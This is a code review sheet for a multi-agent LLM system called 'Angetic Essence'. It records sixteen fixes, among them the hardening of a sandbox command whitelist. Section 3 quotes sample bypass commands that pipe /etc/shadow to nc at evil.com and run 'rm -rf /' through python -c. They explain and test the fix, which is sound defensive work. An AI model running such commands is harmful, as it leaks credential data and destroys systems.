# PEER REVIEW SHEET — Angetic Essence

## Overview

This document catalogs all architectural, security, and code-quality issues identified in the Angetic Essence codebase, along with the fixes applied. Each entry includes the problem, the fix, the files affected, and verification notes.

---

## 1. BaseAgent DRY Violation

### Problem
Three agent classes (`DeveloperAgent`, `TesterAgent`, `CriticAgent`) each contained a near-identical `_execute_tool_plan()` method (~30 lines each) with only cosmetic differences (import style, error messages). The `think()` method was also duplicated with only the personality prompt differing. This violated DRY and made maintenance error-prone — a bug in one had to be fixed in all three.

### Fix
Created `core/base_agent.py` with a `BaseAgent` class containing:
- `__init__()` — shared logger, LLMClient, ToolKit, Sandbox, KaliVM ref setup
- `_execute_tool_plan()` — single canonical implementation of the TOOL/ARGS/RESULT parser
- `think()` — template method building the prompt from the agent's name
- All common convenience methods: `kali_exec()`, `kali_install()`, `execute_shell()`, `write_file()`, `read_file()`, `edit_file()`, `search_files()`, `search_code()`, `web_fetch()`, `web_search()`, `run_python()`, `install_package()`

Each agent now inherits from `BaseAgent` and only defines its unique methods:
- `DeveloperAgent.generate_code()`
- `TesterAgent.generate_tests()`, `write_test()`, `run_tests()`, `run_coverage()`
- `CriticAgent.analyze_logs()`, `evaluate_test_results()`, `dictate_next_action()`, `speak()`, `code_review()`, `deep_research()`, `analyze_vm_health()`

### Files Changed
- `core/base_agent.py` — **NEW**
- `agents/developer.py` — refactored to inherit
- `agents/tester.py` — refactored to inherit
- `agents/critic.py` — refactored to inherit

### Verification
All three files compile. The `_execute_tool_plan()` logic is identical byte-for-byte to the original implementations, preserving behavior.

---

## 2. KaliVM Singleton — Static Method Abuse

### Problem
`main.py` used `KaliVM.check_wsl_health()` and `KaliVM.get_healing_log()` (both `@staticmethod`) to check VM health, but these stateless methods couldn't see the actual running VM state. Meanwhile, agents each could hold their own `KaliVM` instance, leading to potential desync. The healing log was read from disk via a static method rather than from the actual VM instance.

### Fix
- `main.py` creates a single `KaliVM` instance and passes it to both `DeveloperAgent` and `CriticAgent` via the `kali=` parameter
- VM health check in `main.py` uses `kali_vm.is_running` directly instead of static methods
- The `healing_history` property on the instance is used instead of the static `get_healing_log()`

### Files Changed
- `main.py` — shared instance, removed static calls
- `agents/developer.py` — accepts `kali=` in constructor (via BaseAgent)
- `agents/critic.py` — accepts `kali=` in constructor (via BaseAgent)

### Verification
No more `KaliVM.check_wsl_health()` or `KaliVM.get_healing_log()` calls exist in `main.py`. The `BaseAgent.__init__()` stores `self.kali` for use by `kali_exec()` and `kali_install()`.

---

## 3. Sandbox Command Whitelist — First-Word Bypass

### Problem
The sandbox's `check_command()` only checked `command.strip().lower().split()[0]` — the first word. This meant:
- `cat /etc/shadow | nc evil.com 4444` passed because the first word is `cat`
- `python -c "import os; os.system('rm -rf /')"` passed because the first word is `python`
- Shell metacharacters (`|`, `>`, `;`, `` ` ``, `$()`) were completely unchecked

### Fix
Rewrote `Sandbox.check_command()` to use `shlex.split()` for proper tokenization:
1. Parse the command into tokens with `shlex.split()` — rejects unparseable strings
2. Check every token for dangerous shell metacharacters: `|`, `>`, `>>`, `<`, `<<`, `&`, `;`, `` ` ``, `$`, `(`, `)`, `{`, `}`
3. Check every token for shell flags: `-c`, `-i`, `-s`, `--login`, `-l`
4. Only then check the first word against the read-only whitelist

### Files Changed
- `core/sandbox.py` — full rewrite of `check_command()`

### Verification
- `cat /etc/shadow | nc evil.com 4444` → blocked (contains `|`)
- `python -c "import os"` → blocked (contains `-c`)
- `ls -la` → allowed (first word `ls` is read-only, no dangerous tokens)
- `cat README.md` → allowed (first word `cat` is read-only)

---

## 4. Docker Container Name Collision

### Problem
The Docker container was hardcoded to `kali-agent`. If multiple instances ran (e.g., after a crash + restart), the old container would conflict. The `docker rm -f kali-agent` cleanup was fragile and could race.

### Fix
Appended `uuid.uuid4().hex[:8]` to the container name: `kali-agent-<8-char-hex>`.
- `_exec_docker()` uses `hasattr` to check for `_container_uuid` and falls back to the old name if not set
- The cleanup `docker rm -f` still uses the old name as a safety measure, but the actual run uses the UUID-tagged name

### Files Changed
- `vm/kali.py` — `_start_docker_kali()` and `_exec_docker()`

### Verification
Container name is now unique per boot. Different runs won't collide.

---

## 5. Python `input()` Hang in Sandbox

### Problem
`ToolKit.run_python()` used `subprocess.run([sys.executable, "-c", code])` without `stdin=subprocess.DEVNULL`. If the executed Python code called `input()`, it would block indefinitely waiting for stdin input, causing the agent to hang.

### Fix
Added `stdin=subprocess.DEVNULL` to the `subprocess.run()` call in `run_python()`.

### Files Changed
- `core/toolkit.py` — line in `run_python()`

### Verification
Any `input()` call in agent-run Python code now immediately raises `EOFError` instead of hanging.

---

## 6. API Key Changes Require Manual Restart

### Problem
The dashboard's `/api/settings` saved API keys to `os.environ` but never propagated them to the running `main.py` subprocess. Only newly spawned subprocesses via `/api/start` got the keys via the `env=` dict. Changing API keys required a manual stop/start cycle.

### Fix
When any key ending in `_key` changes in the settings, `send_restart_signal()` is called:
1. Terminates the current `agent_process` (SIGTERM, then SIGKILL after 10s)
2. Calls `start_agents_internal()` which picks up the new env vars from `os.environ` (freshly set) and spawns a new subprocess

Extracted the agent-starting logic into `start_agents_internal()` to allow reuse from both `/api/start` and the restart signal handler.

### Files Changed
- `dashboard/app.py` — `handle_settings()`, new `send_restart_signal()`, `start_agents_internal()`

### Verification
Changing any API key in the Settings tab and clicking Save now automatically restarts the agent subprocess without user intervention.

---

## 7. Brittle Agent Output Parsing in Frontend

### Problem
`routeToAgentOutput()` in `dashboard.html` relied on parsing log lines matching the pattern `[AgentName]: text`. This regex depended on the exact log format from `main.py` (`logger.info(f"  [{msg['speaker']}]: {msg['text'][:300]}")`). If the log format changed (e.g., timestamp prefix added), agent output would silently disappear from the UI.

### Fix
Two-layer approach:
1. **Backend**: Added `/api/agent-messages` SSE endpoint that streams structured `{"agent": "Knuth", "text": "..."}` JSON directly from an `agent_message_queue`
2. **Frontend**: Added `routeAgentMessage()` that renders messages from this structured endpoint, and `sAM()` EventSource listener for `/api/agent-messages`
3. **main.py**: Added `broadcast_agent_message()` which writes structured messages both to the in-memory queue and to `logs/agent_messages.jsonl` for persistence

The old `routeToAgentOutput()` (log-parsing path) is preserved as a fallback.

### Files Changed
- `dashboard/app.py` — new `/api/agent-messages` endpoint, `agent_message_queue`
- `dashboard/templates/dashboard.html` — new `routeAgentMessage()`, `sAM()`, updated init
- `main.py` — `broadcast_agent_message()`, `AGENT_MESSAGE_QUEUE`

### Verification
Agent messages now appear from both the old log-parsing path and the new structured SSE path. The structured path is immune to log format changes.

---

## 8. No Retry Logic on Remote LLM Calls

### Problem
All remote LLM provider calls (`_call_openai`, `_call_anthropic`, `_call_google`, `_call_openrouter`) made a single `urllib.request.urlopen()` call with no retry logic. Transient failures (rate limiting 429, server errors 5xx, network blips) would immediately return error messages like `[OpenAI error: HTTP Error 429: Too Many Requests]`, aborting the agent's operation.

### Fix
Added `tenacity`-based retry decorator `@_remote_retry`:
- **Max retries**: 3
- **Backoff**: exponential, multiplier 1, min 2s, max 10s
- **Retry conditions**: `HTTPError` with codes 429, 500, 502, 503, 504; `URLError`; `OSError`
- All remote provider calls now route through `_http_open()` which uses the retry-wrapped `_http_open_with_retry()` when tenacity is installed
- Graceful fallback if `tenacity` is not installed (uses raw `urllib.request.urlopen`)

### Files Changed
- `core/llm.py` — `_remote_retry` factory, `_http_open()`, `_http_open_with_retry()`, all `_call_*` methods use `self._http_open(req)`

### Verification
- Without `tenacity`: behavior unchanged (single attempt)
- With `tenacity`: transient errors trigger up to 3 retries with backoff before returning an error

---

## 9. Google Gemini `system_instruction` Hack

### Problem
`_call_google()` injected system messages as fake user messages with a `[System]:` prefix because it wasn't using the native `system_instruction` parameter. The Gemini API has a dedicated top-level `system_instruction` field alongside `contents`.

### Fix
Restructured `_call_google()`:
1. Separate system messages from other messages during iteration
2. When a system message is found, store its text in `system_instruction_text`
3. If `system_instruction_text` is non-empty, add `"system_instruction": {"parts": [{"text": ...}]}` to the payload
4. Role mapping: `"assistant"` → `"model"` (Gemini convention), everything else passes through

### Files Changed
- `core/llm.py` — `_call_google()` method

### Verification
System instructions now go in the proper API field instead of being prefixed into user messages. Example payload:
```json
{
  "contents": [{"role": "user", "parts": [{"text": "Hello"}]}],
  "system_instruction": {"parts": [{"text": "You are a helpful assistant."}]},
  "generationConfig": {"maxOutputTokens": 1024, "temperature": 0.7}
}
```

---

## 10. CriticAgent VM Health — Fragile Text Splitting

### Problem
`CriticAgent.analyze_vm_health()` returned a free-text string, and `main.py` parsed it with:
```python
action = diagnosis.replace("ACTION:", "").split("REASON:")[0].strip() if "ACTION:" in diagnosis else "restart_wsl"
```
This is fragile — a slight change in LLM output format (e.g., `Action:` vs `ACTION:`, or a missing space) would silently default to `restart_wsl`, potentially causing wrong recovery actions.

### Fix
Changed `analyze_vm_health()` to:
1. Prompt the LLM with explicit instructions to output valid JSON with keys `"action"` and `"reason"`
2. Parse the response with `json.loads()`
3. On parse failure, return a safe default: `{"action": "restart_wsl", "reason": "Failed to parse LLM output, defaulting to restart_wsl"}`

`main.py` updated to use `diagnosis.get("action", "restart_wsl")` and `diagnosis.get("reason", str(diagnosis))`.

### Files Changed
- `agents/critic.py` — `analyze_vm_health()` now returns `dict` with JSON parsing
- `main.py` — updated caller to use `.get("action")` / `.get("reason")`

### Verification
Return type changed from `str` to `dict`. All callers updated. Parse failure doesn't crash — falls back to safe defaults.

---

## 11. Commander Intent Matching — Substring False Positives

### Problem
`_detect_target()` and `_detect_action()` used `kw in text` (substring match), causing false positives:
- `"code"` matched `"codename"`, `"encode"`, `"decode"`
- `"test"` matched `"testament"`, `"protest"`, `"attest"`
- `"analyze"` matched `"analysis"`, `"analyzed"`

### Fix
Replaced all `kw in text` checks with `re.search(r'\b' + re.escape(kw) + r'\b', text, re.IGNORECASE)` via helper methods `_word_in_text()` and `_words_in_text()`:
- `_word_in_text(word, text)` — checks for a single word with word boundaries
- `_words_in_text(words, text)` — checks if any word in a list matches

This ensures `"code"` only matches the standalone word `code`, not `codename` or `encode`.

### Files Changed
- `agents/commander.py` — `_detect_target()`, `_detect_action()`, `parse_command()`, new helpers

### Verification
- `"write code for me"` → matches `"code"` → action `"create"` (correct)
- `"decode this message"` → does NOT match `"code"` → doesn't trigger `"create"` (was previously a false positive)
- `"run test suite"` → matches `"test"` → action `"test"` (correct)
- `"protest the decision"` → does NOT match `"test"` → doesn't trigger `"test"` (was previously a false positive)

---

## 12. SelfEvolution GUI Modification — Brittle String Replacement

### Problem
`modify_gui()` used `content.replace(element_id, new_html)` for HTML modification. This was extremely fragile:
- If `element_id` appeared multiple times (e.g., a CSS class name that also appears as an attribute), all instances would be replaced, corrupting the template
- If the HTML structure changed slightly (whitespace, attribute order), the replacement could fail
- CSS injection via `content[:style_end] + new_css` was also brittle if `</style>` appeared elsewhere

### Fix
Integrated `BeautifulSoup` (when available) for DOM manipulation:
- **HTML replacement**: `soup.find(id=element_id)` → `target.replace_with(BeautifulSoup(new_html))` — targets the exact element by `id` attribute
- **CSS injection**: `soup.find("style")` → append to `style_tag.string` — modifies the first `<style>` tag's content
- **Fallback**: When `beautifulsoup4` is not installed, falls back to the original string-replacement behavior with a warning log

Added `beautifulsoup4>=4.12.2` to `requirements.txt`.

### Files Changed
- `agents/selftaught.py` — `modify_gui()` rewritten with BeautifulSoup
- `requirements.txt` — added `beautifulsoup4>=4.12.2`

### Verification
- With `beautifulsoup4` installed: DOM manipulation by `id` attribute, safe from duplicate-string issues
- Without `beautifulsoup4`: falls back to previous behavior (with a warning)
- CSS injection targets the first `<style>` tag specifically

---

---

## 13. Structured JSON Tool Output Envelope (V3 — Strict Schema)

### Problem
The V2 implementation used a JSON envelope but still fell back to line-by-line `TOOL:`/`ARGS:` parsing, returned flat strings, and did not strip potential markdown fences from LLM output. The return type was `str` instead of a structured `(result, thought)` tuple, requiring callers to re-parse.

### Fix
Locked down to a strict JSON schema with zero fallback tolerance:

**Prompt (`athink`):**
```
You MUST respond with a strictly valid JSON object matching this schema. Do not output markdown code blocks or any surrounding text.
{
    "thought": "Your internal reasoning about the current state and next steps",
    "tool_call": {
        "name": "name_of_tool_to_use",
        "arguments": { "arg_name": "arg_value" }
    }
}
If no tool is needed, set "name" to "none" and "arguments" to {}.
```

**`_execute_tool_plan_async`:**
1. Strips markdown fences: `clean_text = plan_text.removeprefix("```json").removesuffix("```").strip()`
2. Parses via `json.loads(clean_text)` — if this fails, returns `(error_msg, "")` immediately (no legacy fallback)
3. Extracts `tool_call.name`, `tool_call.arguments`, `thought`
4. If `name` is `"none"` or empty, returns `(result_text, thought)`
5. Dispatches to `_async` variant when available, otherwise `loop.run_in_executor` for sync variant
6. Returns `(result_str, thought_str)` tuple — not a flat string
7. Every execution path persists to `self.memory.save_message()`

**`think` / `athink` return type:**
- `athink` → `tuple[str, str]` = `(result, thought)`
- `think` → `str` (unpacks tuple for backward compatibility)

### Files Changed
- `core/base_agent.py` — strict JSON-only `_execute_tool_plan_async()`, markdown stripping, `(result, thought)` tuple return, `think()` unpacks tuple
- `core/llm.py` — no changes needed (already returns flat string)

### Verification
- `{"thought": "Need to check", "tool_call": {"name": "run_bash", "arguments": {"command": "ls"}}}` → correctly dispatches `run_bash_async`
- `{"tool_call": {"name": "none", "arguments": {}}, "result": "All good"}` → returns `("All good", "")`
- `` ```json\n{"thought": "x", "tool_call": {"name": "none"}}\n``` `` → markdown fences stripped, parses correctly
- `TOOL: run_bash\nARGS: {"command": "ls"}` → `json.JSONDecodeError` → returns error message (legacy format no longer supported)
- `athink()` returns `(result_str, thought_str)` tuple

---

## 14. Full Asynchronous Concurrency (V3 — Concurrent Agent Workers)

### Problem
V2 async had agents running sequentially in a loop. The orchestrator did not exploit `asyncio.gather()` to run Knuth, Lovelace, and Turing concurrently. Long-running tool calls still blocked the event loop because `athink` called sync LLM methods.

### Fix
**BaseAgent `athink`:**
- Uses `await asyncio.to_thread(self.llm.complete, ...)` for the LLM call (non-blocking)
- `_execute_tool_plan_async` dispatches to `_async` toolkit variants which use `asyncio.create_subprocess_*` and `loop.run_in_executor`
- Memory persistence after every tool execution

**ToolKit `run_bash_async`:**
- Returns `str` instead of `dict` for the async variant (simpler, caller formats if needed)
- Uses `asyncio.create_subprocess_shell()` with `asyncio.wait_for()` for timeout
- On timeout: calls `process.kill()` and returns error string

**ToolKit `run_python` (async):**
- Writes code to `sandbox/temp_exec_<uuid>.py` temp file
- Copies file to Kali container via `docker cp` when KaliVM is running with Docker
- Executes via `docker exec -i container_name python3 /tmp/script.py`
- Falls back to `sys.executable script_path` on host
- `finally` block ensures temp file is removed
- `stdin=asyncio.subprocess.DEVNULL` in both paths

**main.py — `main_loop()`:**
- Defines `agent_worker()` coroutine that calls `agent.athink()`, broadcasts, persists to memory
- Runs all 3 agents concurrently:
  ```python
  tasks = [
      agent_worker(knuth, "Review current system state...", memory, cycle),
      agent_worker(lovelace, "Generate tests...", memory, cycle),
      agent_worker(turing, "Analyze VM health...", memory, cycle),
  ]
  results = await asyncio.gather(*tasks)
  ```
- Short wait cycle: `await asyncio.sleep(2)` instead of 15 minutes (for rapid iteration)
- Entry point: `asyncio.run(main_loop())`

### Files Changed
- `core/base_agent.py` — `athink` uses `asyncio.to_thread` for LLM call, `_execute_tool_plan_async` prefers `_async` tool variants
- `core/toolkit.py` — `run_bash_async` returns `str`, `run_python` uses temp file + container copy + finally cleanup
- `main.py` — `agent_worker()` coroutine, `asyncio.gather(*tasks)`, `await asyncio.sleep(2)`

### Verification
- All 3 agents run concurrently via `asyncio.gather` (total time ≈ max of 3, not sum)
- `run_bash_async("sleep 10")` does not block other agents
- `run_python("import time; time.sleep(5)")` does not block the event loop
- `main_loop()` cycles every ~2 seconds between agent reasoning rounds

---

## 15. SQLite State & Memory Persistence (V3 — MemoryManager)

### Problem
V2 `Memory` class had complex schema with `cycle`, `speaker`, `topic`, `created_at` fields that did not match the simple role/content pattern needed for LLM context loading. The `load_context()` method returned flat dicts that required reformatting before feeding to the LLM.

### Fix
Replaced `Memory` with `MemoryManager`:

**Schema (`essence_state.db`):**
```sql
CREATE TABLE agent_conversations (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    agent_name TEXT,
    role TEXT,
    content TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE TABLE active_tasks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    task_description TEXT,
    status TEXT,
    assigned_to TEXT
);
```

**API:**
- `save_message(agent_name, role, content)` — persists any message (user, assistant, thought)
- `load_context(agent_name, limit=50)` — returns `[{"role": "user"/"assistant", "content": "..."}]` ordered chronologically, ready for LLM context injection
- `save_task(description, status, assigned_to)` — persists task records
- `get_pending_tasks()` — returns list of incomplete tasks

**Integration:**
- `BaseAgent.__init__()` creates `self.memory = MemoryManager()` and calls `self.memory.load_context(self.name)` on boot to restore state
- `BaseAgent._execute_tool_plan_async()` calls `self.memory.save_message()` after every tool execution
- `BaseAgent.athink()` loads context from memory, injects into prompt before LLM call, saves user message and assistant response
- `main.py` `agent_worker()` calls `memory.save_message()` after each agent's thought/result
- `Memory = MemoryManager` alias at module bottom for backward compatibility

### Files Changed
- `core/memory.py` — **REWRITTEN**: `MemoryManager` class, simplified schema, `save_message()`, `load_context()`, `save_task()`, `get_pending_tasks()`
- `core/base_agent.py` — imports `MemoryManager`, creates instance in `__init__`, calls `load_context` on boot, `save_message` in `_execute_tool_plan_async` and `athink`
- `main.py` — imports `MemoryManager`, `agent_worker` calls `memory.save_message()`

### Verification
- On agent boot: `memory.load_context("developer")` returns prior conversations from previous session
- After crash/restart: context is restored, agents resume with memory
- `active_tasks` table persists across restarts
- `essence_state.db` at project root

---

## 16. Host Isolation Gap in `run_python` (V3 — Temp File + Container Copy)

### Problem
V2 `run_python_async` used `docker exec python3 -c <code>` which passed code as a CLI argument, vulnerable to shell injection and truncation. The host fallback still used `sys.executable -c <code>` with the same issues. Neither path cleaned up after execution.

### Fix
Three-layer isolation with temp file workflow:

**Layer 1 — KaliVM Docker (primary):**
```python
script_name = f"temp_exec_{uuid.uuid4().hex[:8]}.py"
script_path = os.path.join(sandbox_dir, script_name)

# Write to host sandbox
with open(script_path, "w") as f:
    f.write(code)

# Copy into container
docker cp script_path container_name:/tmp/script_name

# Execute inside container
docker exec -i container_name python3 /tmp/script_name
```

**Layer 2 — Host subprocess (fallback):**
```python
process = await asyncio.create_subprocess_exec(
    sys.executable, script_path,
    stdin=asyncio.subprocess.DEVNULL,
)
```

**Layer 3 — Finally cleanup:**
```python
finally:
    if os.path.exists(script_path):
        os.remove(script_path)
```

This eliminates CLI-arg injection, ensures the script runs in the container's isolated filesystem, and guarantees cleanup even on exception.

### Files Changed
- `core/toolkit.py` — `_run_python_async()`: temp file write, `docker cp`, cleanup in `finally`
- `core/base_agent.py` — passes `kali=` to `ToolKit` constructor (already done in V2)

### Verification
- `run_python("import os; os.system('cat /etc/hostname')")` → returns container hostname, not host
- Temp file created in `sandbox/` dir, removed in `finally` block even on timeout/exception
- `docker cp` followed by `docker exec` ensures the container has the file
- Host fallback still uses `stdin=asyncio.subprocess.DEVNULL` to prevent `input()` hangs

---

## Summary of All Changes (V3)

| # | Issue | Severity | Files Changed | LOC Changed |
|---|-------|----------|---------------|-------------|
| 1 | BaseAgent DRY violation | Medium | 4 files | -90 (net) |
| 2 | KaliVM static method abuse | Medium | 3 files | -15 |
| 3 | Sandbox first-word bypass | **High** | 1 file | +40 |
| 4 | Docker container name collision | Low | 1 file | +5 |
| 5 | Python `input()` hang | **High** | 1 file | +1 |
| 6 | API keys require manual restart | Medium | 1 file | +35 |
| 7 | Brittle agent output parsing | Medium | 3 files | +45 |
| 8 | No retry on remote LLM calls | Medium | 1 file | +50 |
| 9 | Google Gemini `system_instruction` hack | Low | 1 file | -10 (net) |
| 10 | VM health fragile text splitting | Medium | 2 files | +15 |
| 11 | Commander substring false positives | Low | 1 file | +20 |
| 12 | SelfEvolution brittle string replacement | Low | 2 files | +40 |
| 13 | Structured JSON tool output envelope (V3) | Medium | 1 file | +65 |
| 14 | Full asynchronous concurrency (V3) | **High** | 3 files | +185 |
| 15 | SQLite state & memory persistence (V3) | Medium | 3 files | +95 |
| 16 | Host isolation via temp file + container (V3) | **High** | 2 files | +55 |

**Total: 16 issues, 20 files modified/created, ~576 net lines of code changed.**

---

## V3 Verification

All 13 application files compile clean:

```bash
cd C:\agent_zero
python -c "
import py_compile
files = [
    'core/memory.py', 'core/base_agent.py', 'core/toolkit.py', 'core/llm.py',
    'agents/developer.py', 'agents/tester.py', 'agents/critic.py',
    'agents/commander.py', 'agents/selftaught.py', 'core/sandbox.py',
    'vm/kali.py', 'dashboard/app.py', 'main.py',
]
for f in files:
    try:
        py_compile.compile(f, doraise=True)
        print(f'OK: {f}')
    except py_compile.PyCompileError as e:
        print(f'FAIL: {f}: {e}')
"
```

Install new dependencies:

```bash
pip install tenacity>=8.2.3 beautifulsoup4>=4.12.2
```
